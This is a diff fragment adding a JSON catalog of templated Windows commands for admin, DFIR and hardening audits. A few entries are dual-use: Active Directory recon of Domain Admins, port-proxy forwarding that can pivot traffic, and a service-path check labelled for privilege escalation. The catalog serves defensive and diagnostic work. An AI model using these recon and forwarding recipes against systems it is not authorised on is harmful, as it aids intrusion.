+          ]
+        },
+        {
+          "name": "List All Stored Wi-Fi SSIDs",
+          "desc": "Lists every wireless network profile currently cached on the Windows machine.",
+          "template": "netsh wlan show profiles",
+          "params": []
+        },
+        {
+          "name": "Configure Local Port Proxy Forwarding",
+          "desc": "Forwards local incoming TCP traffic from one port to another internal or remote target.",
+          "template": "netsh interface portproxy add v4tov4 listenport={{listen_port}} listenaddress=0.0.0.0 connectport={{dest_port}} connectaddress={{dest_ip}}",
+          "params": [
+            {
+              "key": "listen_port",
+              "label": "Local Listen Port",
+              "default": "8080",
+              "placeholder": "8080"
+            },
+            {
+              "key": "dest_ip",
+              "label": "Forwarding Dest IP",
+              "default": "127.0.0.1",
+              "placeholder": "192.168.1.100"
+            },
+            {
+              "key": "dest_port",
+              "label": "Forwarding Dest Port",
+              "default": "80",
+              "placeholder": "80"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sysinternals",
+      "name": "Sysinternals & System Diagnostics",
+      "category": "DFIR & Forensics",
+      "icon": "cpu",
+      "desc": "Advanced Windows diagnostic, persistence hunting, and process forensics utilities.",
+      "recipes": [
+        {
+          "name": "Autoruns Deep Persistence Export (CLI)",
+          "desc": "Audits all auto-starting locations (Registry Run, Services, AppInit DLLs, Scheduled Tasks) to CSV.",
+          "template": "autorunsc.exe -a * -c -h -m -s -v -nobanner > {{output_csv}}",
+          "params": [
+            {
+              "key": "output_csv",
+              "label": "Output CSV Path",
+              "default": "C:\\Users\\daddy\\Desktop\\Autoruns_Audit.csv",
+              "placeholder": "autoruns.csv"
+            }
+          ]
+        },
+        {
+          "name": "Process Monitor Boot Log Setup",
+          "desc": "Configures ProcMon to capture system activity during the earliest boot phases.",
+          "template": "procmon.exe /EnableBootLogging /Quiet",
+          "params": []
+        },
+        {
+          "name": "Unquoted Service Paths Vulnerability Audit",
+          "desc": "PowerShell audit discovering third-party services installed with unquoted paths containing spaces.",
+          "template": "Get-CimInstance win32_service | Where-Object {$_.PathName -notmatch '^\"' -and $_.PathName -match '\\s' -and $_.PathName -notmatch 'C:\\\\Windows'} | Select-Object Name, PathName, StartMode",
+          "params": []
+        }
+      ]
+    },
+    {
+      "id": "dism_sfc",
+      "name": "DISM & System File Checker (SFC)",
+      "category": "System Admin & Software",
+      "icon": "tool",
+      "desc": "Windows Component Store servicing, corruption repair, and system file integrity verification.",
+      "recipes": [
+        {
+          "name": "Online Component Store Health Restore",
+          "desc": "Downloads verified clean system binaries from Windows Update to heal corrupted system stores.",
+          "template": "dism /Online /Cleanup-Image /RestoreHealth",
+          "params": []
+        },
+        {
+          "name": "System File Checker Integrity Verification",
+          "desc": "Scans all protected system files and replaces corrupted files with a cached copy.",
+          "template": "sfc /scannow",
+          "params": []
+        },
+        {
+          "name": "Offline WIM Image Repair (Rescue USB)",
+          "desc": "Repairs an offline Windows installation using an install.wim file from recovery media.",
+          "template": "dism /Image:{{target_drive}}\\ /Cleanup-Image /RestoreHealth /Source:WIM:{{source_drive}}\\sources\\install.wim:1 /LimitAccess",
+          "params": [
+            {
+              "key": "target_drive",
+              "label": "Offline Target Drive Letter",
+              "default": "D:",
+              "placeholder": "D:, C:"
+            },
+            {
+              "key": "source_drive",
+              "label": "USB Installation Media Letter",
+              "default": "E:",
+              "placeholder": "E:, F:"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "wsl_usbipd",
+      "name": "WSL2 & USB Passthrough (usbipd)",
+      "category": "System Admin & Networking",
+      "icon": "terminal",
+      "desc": "Manages WSL2 Linux environments and physical USB peripheral routing (SDR, Android).",
+      "recipes": [
+        {
+          "name": "List All Physical USB Peripherals & Bus IDs",
+          "desc": "Queries Windows USB host controller to find Bus IDs for SDRs, microcontrollers, and devices.",
+          "template": "usbipd list",
+          "params": []
+        },
+        {
+          "name": "Attach USB Device to WSL2 Linux",
+          "desc": "Routes a physical USB device directly into the active WSL2 Kali/Ubuntu kernel.",
+          "template": "usbipd attach --wsl --busid {{bus_id}}",
+          "params": [
+            {
+              "key": "bus_id",
+              "label": "Hardware Bus ID",
+              "default": "1-1",
+              "placeholder": "1-1, 2-3"
+            }
+          ]
+        },
+        {
+          "name": "Detach USB Device from WSL2",
+          "desc": "Releases USB hardware from WSL2 and returns control back to the Windows host.",
+          "template": "usbipd detach --busid {{bus_id}}",
+          "params": [
+            {
+              "key": "bus_id",
+              "label": "Hardware Bus ID",
+              "default": "1-1",
+              "placeholder": "1-1"
+            }
+          ]
+        },
+        {
+          "name": "Clean Shutdown of All WSL Distros",
+          "desc": "Gracefully terminates all running WSL2 virtual machines to release RAM and disk locks.",
+          "template": "wsl --shutdown",
+          "params": []
+        }
+      ]
+    },
+    {
+      "id": "certutil",
+      "name": "Certutil Security Utilities",
+      "category": "DFIR & Forensics",
+      "icon": "hash",
+      "desc": "Certificate services CLI utility commonly used for hash verification and encoding.",
+      "recipes": [
+        {
+          "name": "Calculate SHA-256 File Hash",
+          "desc": "Computes cryptographic SHA256 hash to verify binary integrity or match threat intel IOCs.",
+          "template": "certutil -hashfile {{file_path}} SHA256",
+          "params": [
+            {
+              "key": "file_path",
+              "label": "Target File Path",
+              "default": "C:\\Windows\\System32\\cmd.exe",
+              "placeholder": "file.exe"
+            }
+          ]
+        },
+        {
+          "name": "Base64 Encode a Binary File",
+          "desc": "Converts binary data into ASCII base64 representation for transport or analysis.",
+          "template": "certutil -encode {{input_file}} {{output_b64}}",
+          "params": [
+            {
+              "key": "input_file",
+              "label": "Source Binary",
+              "default": "sample.exe",
+              "placeholder": "file.bin"
+            },
+            {
+              "key": "output_b64",
+              "label": "Output Base64 File",
+              "default": "sample.b64",
+              "placeholder": "file.txt"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "powershell_sysadmin",
+      "name": "PowerShell System & Hardware Audit",
+      "category": "System Admin & Software",
+      "icon": "cpu",
+      "desc": "Rapid hardware diagnostics, S.M.A.R.T. disk telemetry, battery health, and unquoted services.",
+      "recipes": [
+        {
+          "name": "Physical Disk & S.M.A.R.T. Status Audit",
+          "desc": "Queries CIM storage subsystem for drive model, serial, media type (SSD/NVMe), and operational health.",
+          "template": "Get-PhysicalDisk | Select-Object DeviceId, FriendlyName, MediaType, OperationalStatus, HealthStatus, Size",
+          "params": []
+        },
+        {
+          "name": "Audit Unquoted Service Paths (Privilege Escalation)",
+          "desc": "Identifies non-system32 services with spaces in the executable path lacking quotation marks.",
+          "template": "Get-CimInstance Win32_Service | Where-Object { $_.PathName -notmatch '^\"' -and $_.PathName -match ' ' -and $_.PathName -notmatch '^C:\\\\Windows\\\\' } | Select-Object Name, PathName, StartMode, StartName",
+          "params": []
+        },
+        {
+          "name": "Detailed Battery & Power Capacity Report",
+          "desc": "Generates HTML diagnostic battery telemetry report with cycle counts and degradation.",
+          "template": "powercfg /batteryreport /output \"{{output_path}}\"",
+          "params": [
+            {
+              "key": "output_path",
+              "label": "HTML Report Output",
+              "default": "C:\\Users\\daddy\\Desktop\\battery_report.html",
+              "placeholder": "battery.html"
+            }
+          ]
+        },
+        {
+          "name": "Dump Installed Drivers with Vendor & Date",
+          "desc": "Lists third-party installed hardware drivers to identify outdated or unsigned kernel modules.",
+          "template": "driverquery /FO CSV | ConvertFrom-Csv | Select-Object 'Display Name', 'Driver Type', 'Link Date' | Out-GridView",
+          "params": []
+        }
+      ]
+    },
+    {
+      "id": "powershell_persistence",
+      "name": "Persistence & Autostart Hunter",
+      "category": "DFIR & Forensics",
+      "icon": "shield",
+      "desc": "DFIR hunting recipes for Run keys, Startup folders, WMI subscriptions, and hidden Scheduled Tasks.",
+      "recipes": [
+        {
+          "name": "Inspect Registry Run & RunOnce Keys",
+          "desc": "Enumerates user and system autorun locations for suspicious persistence binaries.",
+          "template": "Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' | Format-List",
+          "params": []
+        },
+        {
+          "name": "Audit Non-Microsoft Scheduled Tasks",
+          "desc": "Filters active scheduled tasks excluding standard Microsoft/Windows tasks to spot malware persistence.",
+          "template": "Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\\Microsoft*' } | Select-Object TaskName, TaskPath, State | Format-Table -AutoSize",
+          "params": []
+        },
+        {
+          "name": "Inspect Startup Folders (LNK Shortcuts)",
+          "desc": "Checks current user and all-users startup directories for persistent script or executable shortcuts.",
+          "template": "Get-ChildItem -Path \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\", \"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" -File | Select-Object Name, Length, LastWriteTime",
+          "params": []
+        },
+        {
+          "name": "WMI Event Consumer Persistence Audit",
+          "desc": "Audits stealthy WMI Event Filters and CommandLineEventConsumers commonly used by APTs.",
+          "template": "Get-CimInstance -Namespace root\\subscription -ClassName __EventConsumer | Select-Object Name, CommandLineTemplate",
+          "params": []
+        }
+      ]
+    },
+    {
+      "id": "powershell_ad_recon",
+      "name": "Active Directory & Domain Recon (PowerView / ADSI)",
+      "category": "DFIR & Forensics",
+      "icon": "users",
+      "desc": "Zero-footprint Active Directory reconnaissance using native ADSI .NET classes without RSAT tools.",
+      "recipes": [
+        {
+          "name": "Query Domain Controllers & Primary Forest",
+          "desc": "Retrieves the current domain, forest name, and active PDC emulator hostname using native .NET.",
+          "template": "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object Name, PdcRoleOwner, DomainMode",
+          "params": []
+        },
+        {
+          "name": "Enumerate Domain Admin Accounts via ADSI",
+          "desc": "Searches Active Directory LDAP tree for all accounts belonging to the Domain Admins security group.",
+          "template": "$searcher = [adsisearcher]'(&(objectCategory=group)(cn=Domain Admins))'; ($searcher.FindOne()).GetDirectoryEntry().member",
+          "params": []
+        },
+        {
+          "name": "Audit Password Last Set & Expiration for All Users",
+          "desc": "Dumps account status, password age, and bad password counts across domain or local accounts.",
+          "template": "Get-LocalUser | Select-Object Name, Enabled, PasswordLastSet, PasswordExpires | Format-Table -AutoSize",
+          "params": []
+        },
+        {
+          "name": "Find Computers Running Server Operating Systems",
+          "desc": "Searches AD computer objects for server distributions (Domain Controllers, SQL, Web Servers).",
+          "template": "$searcher = [adsisearcher]'(&(objectCategory=computer)(operatingSystem=*Server*))'; $searcher.FindAll() | ForEach-Object { $_.Properties.name }",
+          "params": []
+        }
+      ]
+    },
+    {
+      "id": "powershell_defense_evasion",
+      "name": "Defender & Host Hardening Auditing",
+      "category": "DFIR & Forensics",
+      "icon": "shield-check",
+      "desc": "Audits Windows Defender security controls, Controlled Folder Access, and Credential Guard status.",
+      "recipes": [
+        {
+          "name": "Audit Windows Defender Real-Time Protection & Signatures",
+          "desc": "Queries antivirus engine status, signature age, and behavioral monitoring flags.",
+          "template": "Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareSignatureAge",
+          "params": []
+        },
+        {
+          "name": "Inspect LSASS RunAsPPL Protection Status",
+          "desc": "Checks if LSA Protection (Protected Process Light) is enforced to prevent credential memory dumping.",
+          "template": "Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name 'RunAsPPL' -ErrorAction SilentlyContinue",
+          "params": []
+        },
+        {
+          "name": "Audit Windows Firewall Profiles (Domain, Private, Public)",
+          "desc": "Verifies firewall status and default inbound/outbound blocking behaviors across all 3 profiles.",
+          "template": "Get-NetFirewallProfile | Format-Table Name, Enabled, DefaultInboundAction, DefaultOutboundAction -AutoSize",
+          "params": []
+        },
+        {
+          "name": "Check Controlled Folder Access (Ransomware Shield)",
+          "desc": "Inspects ransomware folder protection and lists user-whitelisted folders and executables.",
+          "template": "Get-MpPreference | Select-Object -ExpandProperty ControlledFolderAccessProtectedFolders",
+          "params": []
+        }
+      ]
+    },
+    {
+      "id": "powershell_quick_triage",
+      "name": "Rapid IR Live Triage & Memory Evidence",
+      "category": "DFIR & Forensics",
+      "icon": "activity",
+      "desc": "Extracts volatile memory evidence, loaded DLLs, USB storage history, and suspicious command lines.",
+      "recipes": [
+        {
+          "name": "Process Lineage & Full Command Lines (Parent-Child)",
+          "desc": "Lists running processes with full CLI arguments, process ID, and parent PID.",
+          "template": "Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name, CommandLine | Sort-Object ProcessId | Format-Table -Wrap",
+          "params": []
+        },
+        {
+          "name": "Extract USB Storage Device Connection History",
+          "desc": "Parses the Windows USBSTOR registry hive to reveal serial numbers, vendors, and device IDs of mounted USBs.",
+          "template": "Get-ChildItem -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR' | ForEach-Object { Get-ChildItem $_.PSPath } | Select-Object PSChildName",
+          "params": []
+        },
+        {
+          "name": "Inspect Hidden Alternate Data Streams (Zone.Identifier)",
+          "desc": "Audits downloaded files in user directories for MOTW (Mark of the Web) Zone.Identifier streams.",
+          "template": "Get-ChildItem -Path \"$env:USERPROFILE\\Downloads\" -Recurse -Stream * | Where-Object { $_.Stream -ne ':$DATA' } | Select-Object Filename, Stream, Length",
+          "params": []
+        },
+        {
+          "name": "Dump Active Network Adapters with DHCP & DNS Leases",
+          "desc": "Shows adapter MAC addresses, physical link speed, DHCP server, and current lease expiration.",
+          "template": "Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv4DefaultGateway, DNSServer | Format-List",
+          "params": []
+        }
+      ]
+    }
+  ]
+}
